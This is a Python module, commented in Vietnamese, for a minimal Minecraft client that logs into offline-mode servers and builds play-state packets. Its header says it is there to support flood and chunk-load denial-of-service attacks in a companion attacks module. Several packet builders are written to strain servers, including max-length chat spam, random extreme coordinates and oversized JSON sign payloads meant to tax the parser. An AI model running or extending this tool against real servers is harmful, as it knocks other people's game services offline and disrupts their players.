#!/usr/bin/env python3
"""
================================================================================
 MCCLIENT — Minimal Minecraft Client (login + PLAY state packet builder)
================================================================================

MỤC ĐÍCH
--------
Thư viện nhỏ để:
    1) Login vào server Minecraft offline-mode (protocol 1.8 → 1.20.x).
    2) Cung cấp helper xây dựng packet ở LOGIN và PLAY state.
    3) Được dùng bởi các attack trong `attacks.py` (`play_flood`, `chunk_load_dos`).

KHÔNG phải là client đầy đủ. Không render, không physics, không xử lý
inventory. Chỉ đủ để duy trì kết nối và spam packet.

LUỒNG LOGIN (offline-mode)
--------------------------
    Client                     Server
      |-- Handshake(state=2) --->|
      |-- Login Start ---------->|
      |<-- Set Compression ------|     (optional)
      |<-- Login Success --------|
      |-- Login Ack ------------>|     (protocol ≥ 764 = 1.20.2)
      |<-- [CONFIGURATION] ------|     (1.20.2+: registry data, plugin msg)
      |-- Finish Config Ack ---->|
      |====== PLAY STATE ========|

    → `offline_login()` trả về (socket, compression_enabled, threshold)
      khi đã ở PLAY state (hoặc CONFIG nếu server 1.20.2+ — xem giới hạn).

API CHÍNH
---------
    read_varint(sock)                          → int | None
    read_exactly(sock, n)                      → bytes | None
    read_packet(sock, compression=False)       → (pid, payload) | None
    pack_pkt(pid, payload, compression, ...)   → bytes
    offline_login(host, port, username, ...)   → (sock, comp, threshold) | None
    build_play_packet(kind, protocol=763)      → (pid, payload) | None

PACKET ID — SERVERBOUND PLAY STATE (protocol 763 = 1.20/1.20.1)
---------------------------------------------------------------
    kind              pid     ghi chú
    ----------------  ------  -----------------------------------------
    keepalive         0x12    bắt buộc trả lời, server kick nếu trễ
    chat              0x05    kèm chữ ký số (1.19+)
    client_settings   0x08    locale, view distance, skin
    click_window      0x0A    tương tác slot inventory
    position          0x14    di chuyển (không xoay)
    position_rot      0x15    di chuyển + xoay
    player_action     0x1D    đào / đặt / swap item
    update_sign       0x2B    ghi 4 dòng lên biển (parse JSON 4 lần)

    ⚠ Với protocol 764+ (1.20.2+), các ID trên có thể lệch ±2-3 đơn vị.
      Nếu attack `play` báo lỗi "unknown packet id" trong log server,
      cần cập nhật bảng này cho đúng phiên bản.

GIỚI HẠN ĐÃ BIẾT
----------------
    - Chưa xử lý CONFIGURATION state đầy đủ (1.20.2+).
      Với server 1.20.2+, `offline_login()` có thể trả về socket nhưng
      server chưa thực sự cho vào PLAY → PLAY packet bị ignore.
      → Khuyến nghị dùng protocol ≤ 763 (1.20/1.20.1) để test.
    - Chỉ hỗ trợ offline-mode (online-mode=true sẽ bị Disconnect).
    - Không verify chat signature (1.19+).
    - Không xử lý nén streaming (chỉ zlib 1 lần / packet).

LICENSE
-------
    MIT — dùng cho server cá nhân / LAN private.
================================================================================
"""

import random
import socket
import string
import struct
import time
import zlib

from mcproto import write_varint, write_string, pack_packet


# ============================================================
# CẤU HÌNH
# ============================================================
DEFAULT_PROTOCOL = 763      # 1.20 / 1.20.1
MAX_PACKET_LEN = 2 ** 21    # 2MB — giới hạn vanilla
LOGIN_TIMEOUT = 15.0        # giây
DEBUG = False               # đặt True để in packet


def _dbg(msg: str):
    if DEBUG:
        print(f"[mcclient] {msg}")


# ============================================================
# READ HELPERS — socket
# ============================================================
def read_varint(sock) -> int:
    """Đọc VarInt từ socket. Trả None nếu socket đóng giữa chừng."""
    num, shift = 0, 0
    for _ in range(5):
        b = sock.recv(1)
        if not b:
            return None
        byte = b[0]
        num |= (byte & 0x7F) << shift
        if not (byte & 0x80):
            return num
        shift += 7
    raise ValueError("VarInt too long")


def read_exactly(sock, n: int) -> bytes:
    """Đọc đúng n byte từ socket. Trả None nếu đóng giữa chừng."""
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def read_packet(sock, compression: bool = False):
    """
    Đọc 1 packet từ socket.
    Trả về (packet_id, payload) hoặc None nếu lỗi / đóng kết nối.
    """
    length = read_varint(sock)
    if length is None or length <= 0 or length > MAX_PACKET_LEN:
        return None

    data = read_exactly(sock, length)
    if data is None:
        return None

    # --- Tách body ra khỏi lớp compression ---
    if compression:
        body = _decompress_packet_body(data)
        if body is None:
            return None
    else:
        body = data

    # --- Parse packet_id ở đầu body ---
    pid, offset = read_varint_field(body, 0)
    if pid is None:
        return None
    return pid, body[offset:]


def _decompress_packet_body(data: bytes):
    """Xử lý lớp compression: [data_length varint][body]."""
    i, data_length, shift = 0, 0, 0
    while True:
        if i >= len(data):
            return None
        b = data[i]; i += 1
        data_length |= (b & 0x7F) << shift
        if not (b & 0x80):
            break
        shift += 7

    if data_length == 0:
        # Không nén
        return data[i:]
    try:
        return zlib.decompress(data[i:])
    except zlib.error:
        return None


# ============================================================
# READ HELPERS — bytes
# ============================================================
def read_varint_field(data: bytes, offset: int = 0):
    """Đọc 1 trường VarInt trong bytes. Trả (value, next_offset) hoặc (None, offset)."""
    value, shift, i = 0, 0, offset
    while True:
        if i >= len(data):
            return None, offset
        b = data[i]; i += 1
        value |= (b & 0x7F) << shift
        if not (b & 0x80):
            return value, i
        shift += 7
        if shift > 35:
            return None, offset


def read_string_field(data: bytes, offset: int = 0):
    """Đọc 1 trường String (VarInt length + UTF-8). Trả (text, next_offset)."""
    slen, i = read_varint_field(data, offset)
    if slen is None:
        return None, offset
    text = data[i:i + slen].decode("utf-8", "replace")
    return text, i + slen


# ============================================================
# WRITE HELPERS
# ============================================================
def pack_pkt(pid: int, payload: bytes,
             compression: bool = False, threshold: int = -1,
             level: int = 6) -> bytes:
    """
    Đóng gói packet — tự chọn nén nếu compression=True và body ≥ threshold.
    """
    body = write_varint(pid) + payload
    if not compression:
        return write_varint(len(body)) + body

    if len(body) >= threshold:
        comp = zlib.compress(body, level)
        inner = write_varint(len(body)) + comp      # data_length = uncompressed
    else:
        inner = write_varint(0) + body              # 0 = không nén

    return write_varint(len(inner)) + inner


# ============================================================
# LOGIN FLOW
# ============================================================
def _rand_name(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def offline_login(host, port, username=None, protocol=DEFAULT_PROTOCOL,
                  timeout=LOGIN_TIMEOUT):
    """
    Login vào server offline-mode.
    Trả về (socket, compression_enabled, threshold) khi đã vào PLAY,
    hoặc None nếu thất bại (disconnect / timeout / reject).
    """
    username = username or _rand_name()
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((host, port))
    except Exception:
        s.close()
        return None

    # --- Handshake (state=2 login) ---
    hs_payload = (
        write_varint(protocol)
        + write_string(host)
        + struct.pack(">H", port)
        + write_varint(2)
    )
    s.sendall(pack_pkt(0x00, hs_payload))

    # --- Login Start ---
    s.sendall(pack_pkt(0x00, write_string(username)))
    _dbg(f"login start username={username} protocol={protocol}")

    compression = False
    threshold = -1

    # --- Vòng lặp nhận packet cho tới khi vào PLAY ---
    while True:
        try:
            pkt = read_packet(s, compression)
        except (socket.timeout, ConnectionError, OSError):
            s.close()
            return None

        if pkt is None:
            s.close()
            return None

        pid, data = pkt
        _dbg(f"recv pid=0x{pid:02X} len={len(data)}")

        # 0x00 = Disconnect
        if pid == 0x00 and not compression:
            _dbg("disconnect from server")
            s.close()
            return None

        # 0x03 = Set Compression
        if pid == 0x03 and not compression:
            threshold, _ = read_varint_field(data, 0)
            if threshold is None:
                threshold = -1
            compression = True
            _dbg(f"compression enabled threshold={threshold}")
            continue

        # 0x02 = Login Success
        if pid == 0x02:
            _dbg("login success")
            if protocol >= 764:
                # 1.20.2+: gửi Login Acknowledged để vào CONFIGURATION.
                # (Chưa xử lý CONFIG state đầy đủ — xem docstring đầu file.)
                try:
                    s.sendall(pack_pkt(0x03, b"", compression, threshold))
                    _dbg("login acknowledged sent")
                except Exception:
                    pass
            return s, compression, threshold

        # 0x04 = Login Plugin Request → trả lời "không hiểu"
        if pid == 0x04:
            msg_id, _ = read_varint_field(data, 0)
            if msg_id is None:
                continue
            response = write_varint(msg_id) + b"\x00"   # success = false
            try:
                s.sendall(pack_pkt(0x02, response, compression, threshold))
            except Exception:
                s.close()
                return None
            _dbg(f"plugin request id={msg_id} answered")


# ============================================================
# PLAY PACKETS
# ============================================================
def build_play_packet(kind: str, protocol: int = DEFAULT_PROTOCOL):
    """
    Xây dựng 1 packet Serverbound ở PLAY state.
    Trả về (packet_id, payload) hoặc None nếu `kind` không hỗ trợ.

    ⚠ Packet ID cố định theo protocol 763 (1.20/1.20.1).
      Với phiên bản khác, cần cập nhật bảng ID — xem docstring đầu file.
    """
    builder = _PLAY_BUILDERS.get(kind)
    if builder is None:
        return None
    return builder(protocol)


# ---------- Các builder riêng ----------
def _build_chat(protocol):
    """Serverbound Chat Message — 1.20.1 id 0x05."""
    msg = "A" * 256     # max length
    payload = (
        write_string(msg)
        + struct.pack(">q", int(time.time() * 1000))            # timestamp
        + struct.pack(">q", random.randint(-(2**63), 2**63 - 1))  # salt
        + b"\x00"                                                # no signature
        + write_varint(0)                                        # msg count
        + b"\x00\x00\x00"                                        # ack bitset
    )
    return 0x05, payload


def _build_position(protocol):
    """Serverbound Set Player Position — 1.20.1 id 0x14."""
    x = random.uniform(-3.0e7, 3.0e7)
    y = random.uniform(-64.0, 320.0)
    z = random.uniform(-3.0e7, 3.0e7)
    payload = struct.pack(">dddB", x, y, z, 1)   # on_ground = true
    return 0x14, payload


def _build_position_rot(protocol):
    """Serverbound Set Player Position and Rotation — 1.20.1 id 0x15."""
    x = random.uniform(-3.0e7, 3.0e7)
    y = random.uniform(-64.0, 320.0)
    z = random.uniform(-3.0e7, 3.0e7)
    yaw = random.uniform(-180, 180)
    pitch = random.uniform(-90, 90)
    payload = struct.pack(">dddffB", x, y, z, yaw, pitch, 1)
    return 0x15, payload


def _build_keepalive(protocol):
    """Serverbound Keep Alive — 1.20.1 id 0x12."""
    return 0x12, struct.pack(">q", random.randint(-(2**63), 2**63 - 1))


def _build_click_window(protocol):
    """Serverbound Click Window — 1.20.1 id 0x0A."""
    payload = (
        bytes([0])                    # window id 0 (player inventory)
        + write_varint(1)             # state id
        + struct.pack(">h", 36)       # slot 36
        + bytes([0])                  # button
        + write_varint(0)             # mode
        + write_varint(0)             # array length (changed slots)
        + write_varint(0)             # carried item: present=false
    )
    return 0x0A, payload


def _build_player_action(protocol):
    """Serverbound Player Action — 1.20.1 id 0x1D."""
    payload = (
        write_varint(0)                                       # 0 = start digging
        + struct.pack(">q", random.randint(-(2**63), 2**63 - 1))  # position
        + bytes([0])                                          # face
        + write_varint(0)                                     # sequence
    )
    return 0x1D, payload


def _build_update_sign(protocol):
    """Serverbound Update Sign — 1.20.1 id 0x2B.
    Payload JSON lớn × 4 → parser phải chạy JSON parser 4 lần.
    """
    big_line = '{"text":"' + "X" * 300 + '"}'
    payload = (
        struct.pack(">q", random.randint(-(2**63), 2**63 - 1))  # pos
        + b"".join(write_string(big_line) for _ in range(4))    # 4 lines
        + b"\x00"                                               # is_front
    )
    return 0x2B, payload


def _build_client_settings(protocol):
    """Serverbound Client Information — 1.20.1 id 0x08."""
    payload = (
        write_string("vi_vn")   # locale
        + bytes([10])           # view distance (chunks)
        + write_varint(0)       # chat mode
        + b"\x01"               # chat colors
        + bytes([127])          # skin parts (all enabled)
        + write_varint(1)       # main hand = right
        + b"\x00"               # text filtering = disabled
        + b"\x01"               # allow server listing = true
    )
    return 0x08, payload


# Registry tra cứu
_PLAY_BUILDERS = {
    "chat":            _build_chat,
    "position":        _build_position,
    "position_rot":    _build_position_rot,
    "keepalive":       _build_keepalive,
    "click_window":    _build_click_window,
    "player_action":   _build_player_action,
    "update_sign":     _build_update_sign,
    "client_settings": _build_client_settings,
}


# ============================================================
# PUBLIC REGISTRY (cho tiện mở rộng)
# ============================================================
SUPPORTED_PLAY_KINDS = tuple(_PLAY_BUILDERS.keys())


# ============================================================
# SELF-TEST
# ============================================================
if __name__ == "__main__":
    # Test nhanh builder — không cần server
    print(f"Supported PLAY kinds: {', '.join(SUPPORTED_PLAY_KINDS)}")
    for kind in SUPPORTED_PLAY_KINDS:
        result = build_play_packet(kind)
        if result is None:
            print(f"  ✗ {kind:16} → None")
            continue
        pid, payload = result
        pkt = pack_pkt(pid, payload, compression=False)
        print(f"  ✓ {kind:16} → pid=0x{pid:02X}  "
              f"payload={len(payload):4}B  wire={len(pkt):4}B")